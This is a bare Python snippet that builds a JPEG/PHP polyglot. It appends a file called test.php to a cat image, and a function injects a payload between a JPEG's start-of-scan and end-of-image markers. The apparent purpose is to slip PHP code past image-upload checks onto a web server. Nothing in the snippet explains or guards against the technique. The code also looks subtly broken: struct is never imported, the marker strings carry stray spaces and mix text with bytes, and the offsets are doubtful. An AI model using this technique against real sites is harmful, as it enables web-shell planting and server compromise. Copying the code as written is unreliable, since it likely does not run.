cat = open('cat.jpg', 'rb').read()
cat += open('test.php', 'rb').read()
open('kitten.jpg', 'wb').write(cat)

def  insertPayload ( _in ,  _out ,  payload , off ): 
    img  =  _in 
    # look for 'FF DA' (SOS) 
    sos  =  img . index ( " \xFF\xDA " ) 
    sos_size  =  struct . unpack ( '>H' , img [ sos + 2 : sos + 4 ])[ 0 ] 
    sod  =  sos_size + 2 
    # look for 'FF D9' (EOI) 
    eoi  =  img [ sod :] . index ( " \xFF\xD9 " ) 
    # enough size ? 
    if  ( eoi  -  sod  -  off ) >= len ( payload ): 
            _out . write ( img [: sod + sos + off ] + payload + img [ sod + sos + len ( payload ) + off :]) 
            return  True 
    else : 
            return  False